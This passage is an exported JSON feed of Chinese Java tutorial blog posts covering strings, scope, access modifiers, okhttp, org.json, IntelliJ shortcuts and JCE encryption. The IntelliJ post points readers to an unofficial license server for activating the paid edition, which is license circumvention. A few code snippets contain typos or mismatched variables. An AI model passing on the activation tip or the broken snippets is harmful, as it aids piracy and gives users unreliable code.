6.然后点击VCS-Git–add，Git-Commit Files,选择需要提交的文件，输入 commit message，点击 commit 7.然后选择 Git-push 8.push 成功会有提示 9.GitHub 仓库也可以看到文件了 其他产品链接 GitHub 也是如此。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Java 中 String 以及 StringBuffer 和 StringBuider","slug":"Java-中-String-以及-StringBuffer-和-StringBuider","date":"2018-04-12T12:53:42.000Z","updated":"2021-02-26T06:05:29.249Z","comments":true,"path":"posts/39.html","link":"","permalink":"https://awen.me/posts/39.html","excerpt":"String在 Java 中定义一个变量为 string 类型如下: // 定义变量 url 类型为字符串 String url = &quot;www.baidu.com&quot;;String字符串与数组有一个共同点，就是它们被初始化后，长度是不变的，并且内容也不变。如果要改变它的值，就会产生一个新的字符串:","text":"String在 Java 中定义一个变量为 string 类型如下: // 定义变量 url 类型为字符串 String url = &quot;www.baidu.com&quot;;String字符串与数组有一个共同点，就是它们被初始化后，长度是不变的，并且内容也不变。如果要改变它的值，就会产生一个新的字符串: String str = &quot;Hello &quot;; str += &quot;World!&quot;;程序首先产生了str1字符串，并在内存中申请了一段空间。此时要追加新的字符串是不可能的，因为字符串被初始化后，长度是固定的。如果要改变它，只有放弃原来的空间，重新申请能够容纳“Hello World!”字符串的内存空间，然后将“Hello World!”字符串放到内存中。 实际上，String 是java.lang包下的一个类，按照标准的面向对象的语法，其格式应该为： String stringName = new String(&quot;string content&quot;);例如： String url = new String(&quot;http://www.awen.me&quot;);但是由于String特别常用，所以Java提供了一种简化的语法。 使用简化语法的另外一个原因是，按照标准的面向对象的语法，在内存使用上存在比较大的浪费。例如String str = new String(“abc”);实际上创建了两个String对象，一个是”abc”对象，存储在常量空间中，一个是使用new关键字为对象str申请的空间。 常用操作下面是关于字符串的替换、切割、长度使用方法 String url = &quot;www.baidu.com&quot;; System.out.println(url.length()); //输出 13，无论是数字还是字母或汉字，每个字符的长度都是1 String str = &quot;123456789&quot;; System.out.println(str.charAt(0)); // 输出1，str 的索引 0 是1 String str1 = &quot;www.awen.me&quot;; String str2 = str1.replace(&quot;awen.me&quot;,&quot;google.com&quot;); System.out.println(str2); //输出 www.google.com String str3 = &quot;www_awen_me&quot;; String strArr[] = str3.split(&quot;_&quot;); System.out.println(Arrays.toString(strArr));//输出 [www, awen, me]StringBufferString 的值是不可变的，每次对String的操作都会生成新的String对象，不仅效率低，而且耗费大量内存空间。 StringBuffer类和String类一样，也用来表示字符串，但是StringBuffer的内部实现方式和String不同，在进行字符串处理时，不生成新的对象，在内存使用上要优于String。 StringBuffer 默认分配16字节长度的缓冲区，当字符串超过该大小时，会自动增加缓冲区长度，而不是生成新的对象。 /** * String 的值是不可变的，每次对 String 的操作都会生成新的 String 对象，不仅效率低，而且还耗费大量的内存空间 * * StringBuffer 和 String 类一样，也是用来表示字符串，但 StringBuffer 不生成新的对象，在内存使用上要优于 String */ StringBuffer str1 = new StringBuffer(); //分配16个字节长度的缓冲区 StringBuffer str2 = new StringBuffer(512); // 分配512个字节长度的缓冲区 // 在缓存区中存放了字符串，并且在后面预留了16个字节长度的缓冲区 StringBuffer str3 = new StringBuffer(&quot;www.awen.me&quot;); /** * StringBuffer类的主要方法 */ StringBuffer str4 = new StringBuffer(&quot;abcd&quot;);append() 方法// append 方法 StringBuffer str5 = str4.append(true); System.out.println(str4 == str5);//输出 true，注意这里是 str4 的内容变了，不是其地址变了。 String str6 = &quot;adcd&quot;; String str7 = str6 + &quot;efg&quot;; System.out.println(str6 == str7); // 输出 false，因为地址变了 /**字符串的”+“操作实际上也是先创建一个StringBuffer对象，然后调用append()方法将字符串片段拼接起来，最后调用toString()方法转换为字符串。 * * 这样看来，String的连接操作就比StringBuffer多出了一些附加操作，效率上必然会打折扣。 */deleteCharAt() 和 delete()deleteCharAt() 方法用来删除指定位置的字符，并将剩余的字符形成新的字符串。 StringBuffer str = new StringBuffer(&quot;sswsdeed&quot;); str.deleteCharAt(3); // 删除索引为3的字符，即第三个 s,输出 sswdeed System.out.println(str); str.delete(1,4); //删除1-4之间的字符,即输出 seed System.out.println(str);insert()insert() 用来在指定位置插入字符串，可以认为是append()的升级版。 StringBuffer str = new StringBuffer(&quot;sswsdeed&quot;); str.deleteCharAt(3); // 删除索引为3的字符，即第三个 s,输出 sswdeed System.out.println(str); str.delete(1,4); //删除1-4之间的字符,即输出 seed System.out.println(str); str.insert(3,&quot;xyz&quot;); //输出 seexyzd System.out.println(str);setCharAt()setCharAt() 方法用来修改指定位置的字符。 StringBuffer str = new StringBuffer(&quot;sswsdeed&quot;); str.deleteCharAt(3); // 删除索引为3的字符，即第三个 s,输出 sswdeed System.out.println(str); str.delete(1,4); //删除1-4之间的字符,即输出 seed System.out.println(str); str.insert(3,&quot;xyz&quot;); //输出 seexyzd System.out.println(str); str.setCharAt(3,&apos;z&apos;); //输出 seezyzd System.out.println(str);String 和 StringBuffer 的效率对比public static void main(String[] args) { String fragment = &quot;abcdefghijklmnopqrstuvwxyz&quot;; int times = 10000; // 测试 string 对象 long timeStart1 = System.currentTimeMillis(); String str1 = &quot;&quot;; for (int i = 0; i &lt; times; i++) { str1 +=fragment; } long timeEnd1 = System.currentTimeMillis(); System.out.println(&quot;String = [&quot;+(timeEnd1 - timeStart1)+ &quot;ms]&quot;); // 通过StringBuffer long timeStart2 = System.currentTimeMillis(); StringBuffer str2 = new StringBuffer(); for (int i = 0; i &lt; times; i++) { str2.append(fragment); } long timeEnd2 = System.currentTimeMillis(); System.out.println(&quot;StringBuffer= [&quot; + (timeEnd2 - timeStart2) + &quot;ms]&quot;); } 结果: StringBuilder类StringBuilder类和StringBuffer类功能基本相似，方法也差不多，主要区别在于StringBuffer类的方法是多线程安全的，而StringBuilder不是线程安全的，相比而言，StringBuilder类会略微快一点。 使用环境: 操作少量的数据使用 String； 单线程操作大量数据使用 StringBuilder； 多线程操作大量数据使用 StringBuffer。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Java 的变量作用域","slug":"Java-的变量作用域","date":"2018-04-12T12:29:37.000Z","updated":"2021-02-26T06:05:29.250Z","comments":true,"path":"posts/64205.html","link":"","permalink":"https://awen.me/posts/64205.html","excerpt":"在Java中，变量的作用域分为四个级别：类级、对象实例级、方法级、块级。 类级变量又称全局级变量或静态变量，需要使用static关键字修饰，你可以与 C/C++ 中的 static 变量对比学习。类级变量在类定义后就已经存在，占用内存空间，可以通过类名来访问，不需要实例化。","text":"在Java中，变量的作用域分为四个级别：类级、对象实例级、方法级、块级。 类级变量又称全局级变量或静态变量，需要使用static关键字修饰，你可以与 C/C++ 中的 static 变量对比学习。类级变量在类定义后就已经存在，占用内存空间，可以通过类名来访问，不需要实例化。 对象实例级变量就是成员变量，实例化后才会分配内存空间，才能访问。 方法级变量就是在方法内部定义的变量，就是局部变量。 块级变量就是定义在一个块内部的变量，变量的生存周期就是这个块，出了这个块就消失了，比如 if、for 语句的块。块是指由大括号包围的代码，例如： { int age = 3; String name = &quot;www.weixueyuan.net&quot;; // 正确，在块内部可以访问 age 和 name 变量 System.out.println( name + &quot;已经&quot; + age + &quot;岁了&quot;); } // 错误，在块外部无法访问 age 和 name 变量 System.out.println( name + &quot;已经&quot; + age + &quot;岁了&quot;);说明 方法内部除了能访问方法级的变量，还可以访问类级和实例级的变量。 块内部能够访问类级、实例级变量，如果块被包含在方法内部，它还可以访问方法级的变量。 方法级和块级的变量必须被显示地初始化，否则不能访问。 代码 public class Dog { public static String name = &quot;name&quot;; // 类级变量 public int i; // 对象实例级变量 { int j = 2; // 块级变量 } public void test1 (){ // 方法级变量 int j = 1; if (j ==1 ) { int k = 5; // 块级变量 } System.out.println(name + i + j ); // 这里不能访问块级变量，块级别变量只能在块内部访问 } public static void main(String[] args) { // 不创建对象，直接通过类名访问类级别变量 System.out.println(Dog.name); //创建对象并访问它的方法 Dog d = new Dog(); d.test1(); } }","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Java 中的访问修饰符","slug":"Java-中的访问修饰符","date":"2018-04-12T12:15:04.000Z","updated":"2021-02-26T06:05:29.250Z","comments":true,"path":"posts/47679.html","link":"","permalink":"https://awen.me/posts/47679.html","excerpt":"Java 通过修饰符来控制类、属性和方法的访问权限和其他功能，通常放在语句的最前端。 Java 的修饰符很多，分为访问修饰符和非访问修饰符。 访问修饰符也叫访问控制符，是指能够控制类、成员变量、方法的使用权限的关键字。","text":"Java 通过修饰符来控制类、属性和方法的访问权限和其他功能，通常放在语句的最前端。 Java 的修饰符很多，分为访问修饰符和非访问修饰符。 访问修饰符也叫访问控制符，是指能够控制类、成员变量、方法的使用权限的关键字。 在面向对象编程中，访问控制符是一个很重要的概念，可以使用它来保护对类、变量、方法和构造方法的访问。 Java支持四种不同的访问权限： 修饰符 说明 public 共有的，对所有类可见。 protected 受保护的，对同一包内的类和所有子类可见。 private 私有的，在同一类内可见。 默认的 在同一包内可见。默认不使用任何修饰符。 public：公有的被声明为public的类、方法、构造方法和接口能够被任何其他类访问。 如果几个相互访问的public类分布在不用的包中，则需要导入相应public类所在的包。由于类的继承性，类所有的公有方法和变量都能被其子类继承。 下面的方法使用了公有访问控制： public static void main(String[] args) { Teddy d = new Teddy(); d.bark(); }在 Java 程序的 main() 方法必须设置成公有的，否则，Java 解释器将不能运行该类。 protected：受保护的被声明为protected的变量、方法和构造方法能被同一个包中的任何其他类访问，也能够被不同包中的子类访问。 protected访问修饰符不能修饰类和接口，方法和成员变量能够声明为protected，但是接口的成员变量和成员方法不能声明为protected。 子类能访问protected修饰符声明的方法和变量，这样就能保护不相关的类使用这些方法和变量。 下面的父类使用了protected访问修饰符，子类重载了父类的bark()方法。 public class Dog { protected void bark() { System.out.printf(&quot;汪汪，不要过来&quot;); } } class Teddy extends Dog { // Teddy 继承父类 Dog protected void bark() { // 重写了 bark 方法 System.out.printf(&quot;汪汪，我好怕，不要跟着我&quot;); } public static void main(String[] args) { Teddy d = new Teddy(); d.bark(); } }如果把bark()方法声明为private，那么除了Dog之外的类将不能访问该方法。如果把bark()声明为public，那么所有的类都能够访问该方法。如果我们只想让该方法对其所在类的子类可见，则将该方法声明为protected。 private：私有的私有访问修饰符是最严格的访问级别，所以被声明为private的方法、变量和构造方法只能被所属类访问，并且类和接口不能声明为private。 声明为私有访问类型的变量只能通过类中公共的Getter/Setter方法被外部类访问。 private访问修饰符的使用主要用来隐藏类的实现细节和保护类的数据。 默认的：不使用任何关键字不使用任何修饰符声明的属性和方法，对同一个包内的类是可见的。接口里的变量都隐式声明为public static final，而接口里的方法默认情况下访问权限为public。 访问控制和继承请注意以下方法继承（不了解继承概念的读者可以跳过这里，或者点击 Java继承和多态 预览）的规则： 父类中声明为public的方法在子类中也必须为public。 父类中声明为protected的方法在子类中要么声明为protected，要么声明为public。不能声明为private。 父类中默认修饰符声明的方法，能够在子类中声明为private。 父类中声明为private的方法，不能够被继承。 如何使用访问控制符访问控制符可以让我们很方便的控制代码的权限：当需要让自己编写的类被所有的其他类访问时，就可以将类的访问控制符声明为 public。当需要让自己的类只能被自己的包中的类访问时，就可以省略访问控制符。当需要控制一个类中的成员数据时，可以将这个类中的成员数据访问控制符设置为 public、protected，或者省略。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Java 的 this 关键词","slug":"Java-的-this-关键词","date":"2018-04-12T05:23:00.000Z","updated":"2021-02-26T06:05:29.250Z","comments":true,"path":"posts/5253.html","link":"","permalink":"https://awen.me/posts/5253.html","excerpt":"Java 的 this 关键字用来表示当前对象本身，或当前类的一个实例，通过 this 可以调用本对象的所有方法和属性。例如：","text":"Java 的 this 关键字用来表示当前对象本身，或当前类的一个实例，通过 this 可以调用本对象的所有方法和属性。例如： public class Demo { public int x = 10; public int y = 15; public void sum(){ // 通过 this 取得成员变量 int z = this.x + this.y; System.out.println(&quot;x+y=&quot;+z); } public static void main(String[] args) { Demo obj = new Demo(); obj.sum(); } }上面的程序中，obj 是 Demo 类的一个实例，this 与 obj 等价，执行 int z = this.x + this.y;，就相当于执行 int z = obj.x + obj.y;。 使用this区分同名变量成员变量与方法内部的变量重名时，希望在方法内部调用成员变量只能使用this，例如： public class Demo { public String name; public int age; public Demo(String name,int age) { this.name = name; this.age = age; } public void say() { System.out.println(&quot;Name:&quot;+name +&quot; age:&quot;+ age); } public static void main(String[] args) { Demo obj = new Demo(&quot;阿文&quot;,23); obj.say(); } }形参的作用域是整个方法体，是局部变量。在Demo()中，形参和成员变量重名，如果不使用this，访问到的就是局部变量name和age，而不是成员变量。在 say() 中，我们没有使用 this，因为成员变量的作用域是整个实例，当然也可以加上 this： public void say() { System.out.println(&quot;Name:&quot;+this.name +&quot; age:&quot;+ this.age); }Java 默认将所有成员变量和成员方法与 this 关联在一起，因此使用 this 在某些情况下是多余的。 作为方法名来初始化对象也就是相当于调用本类的其它构造方法，它必须作为构造方法的第一句。示例如下： public class Demo { public String name; public int age; public Demo(){ this(&quot;阿文&quot;,23); } public Demo(String name,int age) { this.name = name; this.age = age; } public void say() { System.out.println(&quot;Name:&quot;+this.name +&quot; age:&quot;+ this.age); } public static void main(String[] args) { Demo obj = new Demo(); obj.say(); } }注意 在构造方法中调用另一个构造方法，调用动作必须置于最起始的位置。 不能在构造方法以外的任何方法内调用构造方法。 在一个构造方法内只能调用一个构造方法。 上述代码还涉及到方法重载，即Java允许出现多个同名方法，只要参数不同就可以。 作为参数传递public class Demo { public static void main(String[] args) { B b = new B(new A()); } } class A{ public A(){ new B(this).print(); // 匿名对象 } public void print() { System.out.println(&quot;A&quot;); } } class B { A a; public B(A a) { this.a = a; } public void print(){ a.print(); System.out.println(&quot;B&quot;); } }匿名对象就是没有名字的对象。如果对象只使用一次，就可以作为匿名对象，代码中 new B(this).print(); 等价于 ( new B(this) ).print();，先通过 new B(this) 创建一个没有名字的对象，再调用它的方法。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"简单了解下 Java 的Json 类","slug":"简单了解下-Java-的Json-类","date":"2018-04-11T12:00:22.000Z","updated":"2021-02-26T06:05:29.349Z","comments":true,"path":"posts/2806.html","link":"","permalink":"https://awen.me/posts/2806.html","excerpt":"Java 的 json 可以通过 org.json 来实现，本文主要讲解下 json 的使用，我们通过一个真实的案例来说明下json 在 Java 中的应用。","text":"Java 的 json 可以通过 org.json 来实现，本文主要讲解下 json 的使用，我们通过一个真实的案例来说明下json 在 Java 中的应用。 首先，我们要在工程中导入 json ，通过 maven 下载 &lt;!-- https://mvnrepository.com/artifact/org.json/json --&gt; &lt;dependency&gt; &lt;groupId&gt;org.json&lt;/groupId&gt; &lt;artifactId&gt;json&lt;/artifactId&gt; &lt;version&gt;20180130&lt;/version&gt; &lt;/dependency&gt;剩下的看代码吧，这是一段是获取网易云的云服务器 token 值 package com.netease.nvm; import okhttp3.*; import org.json.JSONObject; import java.io.IOException; public class NosAuth { public static void main(String[] args) throws IOException { final String ACCESSKEY = &quot;&quot;; final String SECREKEY = &quot;&quot;; final String API = &quot;https://open.c.163.com&quot;; // 创建 json 对象，并添加键值对 JSONObject json = new JSONObject(); json.put(&quot;app_key&quot;,ACCESSKEY); json.put(&quot;app_secret&quot;,SECREKEY); // 创建 okHttp 对象 OkHttpClient client = new OkHttpClient(); // 设置类型为 application/json MediaType mediaType = MediaType.parse(&quot;application/json&quot;); // 构建 body 内容 RequestBody body = RequestBody.create(mediaType,json.toString()); // 发送 request 请求 Request request = new Request.Builder() .url(API+&quot;/api/v1/token&quot;) .post(body) .addHeader(&quot;Content-Type&quot;, &quot;application/json&quot;) .addHeader(&quot;Cache-Control&quot;, &quot;no-cache&quot;) .build(); // 获取响应信息 Response response = client.newCall(request).execute(); // 如果响应状态 为401 则说明认证失败 if (response.code() == 401 ) { System.out.printf(&quot;请检查 app_key 或 app_secret 的值是否正确 \\n&quot;); } // 获取 token 信息 String jsonMessage = response.body().string(); // 将 字符串 转为 json 对象 JSONObject myJsonObject = new JSONObject(jsonMessage); // 获取 json 中的key 的值 System.out.printf(myJsonObject.getString(&quot;token&quot;)); } }最终得到","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Java 输出变量类型","slug":"Java-输出变量类型","date":"2018-04-11T11:40:53.000Z","updated":"2021-02-26T06:05:29.250Z","comments":true,"path":"posts/11168.html","link":"","permalink":"https://awen.me/posts/11168.html","excerpt":"","text":"在 Java 中要查看变量的类型可以使用 .getClass().getName() 查看 例如： System.out.printf(json.toString().getClass().getName()+&quot;\\n&quot;);输出 java.lang.String则说明是个 String 如果去掉 toString System.out.printf(json.getClass().getName()+&quot;\\n&quot;);则输出 org.json.JSONObject是个 json 类。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"okhttp 的使用","slug":"okhttp-的使用","date":"2018-04-11T05:22:28.000Z","updated":"2021-02-26T06:05:29.281Z","comments":true,"path":"posts/31142.html","link":"","permalink":"https://awen.me/posts/31142.html","excerpt":"OkHttp 库的设计和实现的首要目标是高效。官网写着 适用于Android和Java应用程序的HTTP和HTTP / 2客户端","text":"OkHttp 库的设计和实现的首要目标是高效。官网写着 适用于Android和Java应用程序的HTTP和HTTP / 2客户端 OkHttp是默认有效的HTTP客户端： HTTP / 2支持允许同一主机的所有请求共享一个套接字。连接池减少了请求延迟（如果HTTP / 2不可用）。透明GZIP缩小了下载大小。响应缓存完全避免网络重复请求。当网络很麻烦时，OkHttp会坚持下去：它会默默地从常见的连接问题中恢复过来。如果您的服务有多个IP地址，如果第一次连接失败，OkHttp将尝试备用地址。这对IPv4 + IPv6和冗余数据中心托管的服务是必需的。OkHttp启动与现代TLS功能（SNI，ALPN）的新连接，并且如果握手失败则回退到TLS 1.0。 使用OkHttp很容易。其请求/响应API的设计具有流畅的构建器和不变性。它支持同步阻塞调用和带回调的异步调用。 OkHttp支持Android 2.3及以上版本。对于Java，最低要求是1.7。 GitHub 地址 点击这里 maven 加入 &lt;dependency&gt; &lt;groupId&gt;com.squareup.okhttp3&lt;/groupId&gt; &lt;artifactId&gt;okhttp&lt;/artifactId&gt; &lt;version&gt;3.10.0&lt;/version&gt; &lt;/dependency&gt;代码 package com.nossdk.demo; import okhttp3.OkHttpClient; import okhttp3.Request; import okhttp3.Response; import java.io.IOException; public class okhttpdemo { // 创建 okHttpClient 对象 OkHttpClient client = new OkHttpClient(); // 创建一个 Request String run(String url) throws IOException { Request request = new Request.Builder().url(url).build(); try (Response response = client.newCall(request).execute()) { return response.body().string(); } } public static void main(String[] args) throws IOException { okhttpdemo httpdemo = new okhttpdemo(); String respone = httpdemo.run(&quot;http://www.163.com&quot;); System.out.println(respone); } }得到如下结果 问题 try (Response response = client.newCall(request).execute()) { return response.body().string(); }这段报错 try-with-resources is not supported in -source 5解决办法 设置当前模块的 Source Language Level: File -&gt; Project Structure -&gt; Modules -&gt; Sources -&gt; Language Level 基本使用HTTP GET OkHttpClient client = new OkHttpClient(); String run(String url) throws IOException { Request request = new Request.Builder().url(url).build(); Response response = client.newCall(request).execute(); if (response.isSuccessful()) { return response.body().string(); } else { throw new IOException(&quot;Unexpected code &quot; + response); } }Request是OkHttp中访问的请求，Builder是辅助类。Response即OkHttp中的响应。 Response 类 public boolean isSuccessful() Returns true if the code is in [200..300), which means the request was successfully received, understood, and accepted.response.body()返回ResponseBody类 可以方便的获取string public final String string() throws IOException Returns the response as a string decoded with the charset of the Content-Type header. If that header is either absent or lacks a charset, this will attempt to decode the response body as UTF-8.Throws: IOException当然也能获取到流的形式： public final InputStream byteStream() HTTP POST POST提交Json数据 public static final MediaType JSON = MediaType.parse(&quot;application/json; charset=utf-8&quot;); OkHttpClient client = new OkHttpClient(); String post(String url, String json) throws IOException { RequestBody body = RequestBody.create(JSON, json); Request request = new Request.Builder() .url(url) .post(body) .build(); Response response = client.newCall(request).execute(); f (response.isSuccessful()) { return response.body().string(); } else { throw new IOException(&quot;Unexpected code &quot; + response); } }使用Request的post方法来提交请求体RequestBody POST提交键值对很多时候我们会需要通过POST方式把键值对数据传送到服务器。 OkHttp提供了很方便的方式来做这件事情。 OkHttpClient client = new OkHttpClient(); String post(String url, String json) throws IOException { RequestBody formBody = new FormEncodingBuilder() .add(&quot;platform&quot;, &quot;android&quot;) .add(&quot;name&quot;, &quot;bug&quot;) .add(&quot;subject&quot;, &quot;XXXXXXXXXXXXXXX&quot;) .build(); Request request = new Request.Builder() .url(url) .post(body) .build(); Response response = client.newCall(request).execute(); if (response.isSuccessful()) { return response.body().string(); } else { throw new IOException(&quot;Unexpected code &quot; + response); } }总结通过上面的例子我们可以发现，OkHttp在很多时候使用都是很方便的，而且很多代码也有重复，因此特地整理了下面的工具类。 注意 OkHttp官方文档并不建议我们创建多个OkHttpClient，因此全局使用一个。 如果有需要，可以使用clone方法，再进行自定义。这点在后面的高级教程里会提到。 enqueue为OkHttp提供的异步方法，入门教程中并没有提到，后面的高级教程里会有解释。","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Mac 快速不断网锁屏","slug":"Mac-快速不断网锁屏","date":"2018-04-11T04:19:15.000Z","updated":"2021-02-26T06:05:29.259Z","comments":true,"path":"posts/50198.html","link":"","permalink":"https://awen.me/posts/50198.html","excerpt":"","text":"在使用 windows 的时候如果要快速锁屏可以按 win + L 键，而 mac 则可以同时按住control+shift+power（电源键）进行锁屏，锁屏后屏幕将熄灭，按任意键唤醒后需要输入密码。","categories":[],"tags":[]},{"title":"IntelliJ 的使用入门","slug":"IntelliJ-IDEA-MAC-快捷键","date":"2018-04-11T03:07:02.000Z","updated":"2021-02-26T06:05:29.249Z","comments":true,"path":"posts/36447.html","link":"","permalink":"https://awen.me/posts/36447.html","excerpt":"IntelliJ IDEA 是一款非常优秀的 IDE ，主要是用来写 Java 程序，当然 Android 等其他程序也是可以写的。他与 eclipse 的操作还是有很大的区别的，刚上手会找不着北，这里把一些注意事项写下来","text":"IntelliJ IDEA 是一款非常优秀的 IDE ，主要是用来写 Java 程序，当然 Android 等其他程序也是可以写的。他与 eclipse 的操作还是有很大的区别的，刚上手会找不着北，这里把一些注意事项写下来 注册1.如果是写个简单的 Java 程序 不需要用到框架什么的，免费的就够用了。如果是选的旗舰版需要激活，安装的时候选择License server 输入 http://xdouble.cn:8888/ 我这个版本是2018.1.1 快捷键 键位 功能介绍 使用说明 推荐指数 tab+**空格** 基本代码补全功能，包括类名、方法名、或者变量名 当你想要偷懒时可以使用这个功能 4 tab+shift+**空格** 智能代码补全 4 command+shift+return 完成代码 例如：当你写一个for循环，IDE能够自动补写一些代码，减少程序员敲击工作量 3 command+p 显示使用的方法传入的参数信息 当正在调用某个方法时使用 command+n 生成代码 可以直接生成Getter Setter，构造方法等 5 tab+”**相应方法或变量首字母**” 生成代码 生成与字母对应变量或者方法的getter或者setter方法 3 tab+O 覆写方法 例如：你可以通过在编辑器中使用该组合按键覆写Object类的clone方法 4 tab+I 实现方法 可以通过该组合按键实现一些你的类实现的借口的类未实现的方法，也能覆写某些方法 3 command+option+t 用if else, try catch包裹 用if else try catch while等包裹选中的代码块 5 command+/ 行注释 不用多说 5 command+option+/ 块注释 不用多说 5 option+**上方向键** 选中附近的代码块（可多次敲击方向键） 自己上手体会 4 option+**下方向键** 删除选中附近的代码块（可多次敲击方向键） 自己上手体会 4 option+return 快速修复 comman+option+L 格式化代码 在eclipse中使用是ctrl+shift+F 5 tab+option+o 输入特殊字符ø 输入特殊字符用 2 tab+option+i 输入特殊字符ˆ 输入特殊字符用 2 option+**右方向键** 选中附近的代码块（可多次敲击方向键） 自己上手体会 4 option+**左方向键** 删除选中附近的代码块（可多次敲击方向键） 自己上手体会 4 command+X 剪切 5 command+C 复制 5 command+V 粘贴 5 command+shift+V 粘贴最近缓存中的内容 4 command+D 复制当前行 4 command+delete 删除当前行 5 command+return 智能拆分当前代码 拆分 4 command+shift+ + 展现折叠起来的代码块 3 command+shift+ - 折叠代码块 3 command+w 关闭正在编辑中的页 如果打开很多页，可以用这个快捷键组合将之关闭 3 command+ + 展开当前代码块 4 command+ - 折叠当前代码块 4 option+delete 删除代码开始前部分 3 command+f 本页查找 5 command+g 向下查找 5 command+shift+g 向前查找 5 command+r 本页替换 4 command+shift+f 更大范围更多条件查找 4 command+shift+r 更大范围更多条件替换 4 command+shift+s 结构相似搜索 例如你想浏览一个源码项目如何工作的，你需要查找某个更模糊的条件e.g. A implements B 有实现关系的所有类，或者满足某正则表达式的所有情况。可以搜索查找：IntelliJ IDEA :: Structural Search and Replace: What, Why, and How-to 3 command+shift+m 结构相似替换 3 option+r 输入特殊字符® 2 option+f7 显示所有该方法或者变量的用法usage 3 control+r run 5 control+d deg 5 command+f9 编译工程(修改和依赖) 4 command+shift+f9 编译选择的工程，依赖，文件 command+s 保存全部 5 command+0,1……9 打开相应工具箱 command+4打开console 5 shift+command+a 查找相应IDEA操作 当你不知道相应操作的快捷键时，可以查询哦 5 shift+f6 重名名映射操作 选择你要重命名的类，注意是在在编辑器中 5 command+option+j 用动态模板包裹 4 command+j 插入动态模板 4 command+u 查看父类方法 5 control+h 查看类的依赖继承层次 如果一个类有很多依赖继承关系可以使用该按键组合查看 3 control+shift+h 查看方法的层次关系 3 command+o 跳转到一个类 3 command+shift+o 跳转到一个方法 3 command+option+o 跳转到一个symbol 3 缺少包如果你从外面复制过来的 code 没有导入包其方法显示的是红色的（和主题有关系） 在 eclipse 中是在代码下出现红色波浪线，点击下就可以导入包了，而默认在 IDEA 中则需要按 alt+enter，然后选择 import class 执行程序按键 ctrl+shift +r 或者选择 class 右键执行 或者右上角选择播放按钮 代码补全在 IDEA 中 输入程序的最开始几个字母即可补全了比如输入 souf 则输出 System.out.printf(&quot;&quot;);在比如输入 psvm 则输出 public static void main(String[] args) { }","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://awen.me/tags/Java/"}]},{"title":"Java加密扩展 JCE","slug":"Java加密扩展-JCE","date":"2018-04-10T03:08:56.000Z","updated":"2021-02-26T06:05:29.251Z","comments":true,"path":"posts/33176.html","link":"","permalink":"https://awen.me/posts/33176.html","excerpt":"使用 RSA 加密上传文件到网易云存储，发现报错 Make sure you have the JCE unlimited strength policy files installed and configured for your JVM","text":"使用 RSA 加密上传文件到网易云存储，发现报错 Make sure you have the JCE unlimited strength policy files installed and configured for your JVM 原因是缺少 Java 加密扩展 JCE 解决办法我的环境是 Java 8 ，可以去这里下载 下载后得到2个 jar 文件 我的环境是 mac 将其拷贝到 /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre/lib/security 再次运行程序即可。 网易云 AWS S3 RSA 加密方式上传文件代码package awsnos.awsnos; import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.IOException; import java.security.KeyFactory; import java.security.KeyPair; import java.security.KeyPairGenerator; import java.security.NoSuchAlgorithmException; import java.security.PrivateKey; import java.security.PublicKey; import java.security.SecureRandom; import java.security.spec.InvalidKeySpecException; import java.security.spec.PKCS8EncodedKeySpec; import java.security.spec.X509EncodedKeySpec; import javax.crypto.KeyGenerator; import javax.crypto.SecretKey; import javax.crypto.spec.SecretKeySpec; import com.amazonaws.ClientConfiguration; import com.amazonaws.Protocol; import com.amazonaws.auth.AWSStaticCredentialsProvider; import com.amazonaws.auth.BasicAWSCredentials; import com.amazonaws.client.builder.AwsClientBuilder; import com.amazonaws.services.s3.AmazonS3Encryption; import com.amazonaws.services.s3.AmazonS3EncryptionClientBuilder; import com.amazonaws.services.s3.model.CryptoConfiguration; import com.amazonaws.services.s3.model.CryptoMode; import com.amazonaws.services.s3.model.CryptoStorageMode; import com.amazonaws.services.s3.model.EncryptionMaterials; import com.amazonaws.services.s3.model.EncryptionMaterialsProvider; import com.amazonaws.services.s3.model.StaticEncryptionMaterialsProvider; public class Aws3 { // loadKeyPair的实现方式，非对称加密algorithm = RSA public static KeyPair loadKeyPairRSA(String path, String algorithm) throws IOException, NoSuchAlgorithmException, InvalidKeySpecException { // read public key from file File filePublicKey = new File(path + &quot;/public.key&quot;); FileInputStream fis = new FileInputStream(filePublicKey); byte[] encodedPublicKey = new byte[(int) filePublicKey.length()]; fis.read(encodedPublicKey); fis.close(); // read private key from file File filePrivateKey = new File(path + &quot;/private.key&quot;); fis = new FileInputStream(filePrivateKey); byte[] encodedPrivateKey = new byte[(int) filePrivateKey.length()]; fis.read(encodedPrivateKey); fis.close(); // Convert them into KeyPair KeyFactory keyFactory = KeyFactory.getInstance(algorithm); X509EncodedKeySpec publicKeySpec = new X509EncodedKeySpec(encodedPublicKey); PublicKey publicKey = keyFactory.generatePublic(publicKeySpec); PKCS8EncodedKeySpec privateKeySpec = new PKCS8EncodedKeySpec(encodedPrivateKey); PrivateKey privateKey = keyFactory.generatePrivate(privateKeySpec); return new KeyPair(publicKey, privateKey); } // 对称加密，algorithm = AES public static SecretKeySpec loadKeyPairAES(String path, String algorithm) throws IOException { // Read private key from file. File keyFile = new File(path); FileInputStream keyfis = new FileInputStream(keyFile); byte[] encodedPrivateKey = new byte[(int) keyFile.length()]; keyfis.read(encodedPrivateKey); keyfis.close(); // Generate secret key. return new SecretKeySpec(encodedPrivateKey, algorithm); } // 生成Key的方式，非对称加密 public static KeyPair genKeyPair(String algorithm, int bitLength) throws NoSuchAlgorithmException { KeyPairGenerator keyGenerator = KeyPairGenerator.getInstance(algorithm); SecureRandom srand = new SecureRandom(); keyGenerator.initialize(bitLength, srand); return keyGenerator.generateKeyPair(); } // 生成Key的方式，对称加密 public static SecretKey generateCMasterKey() 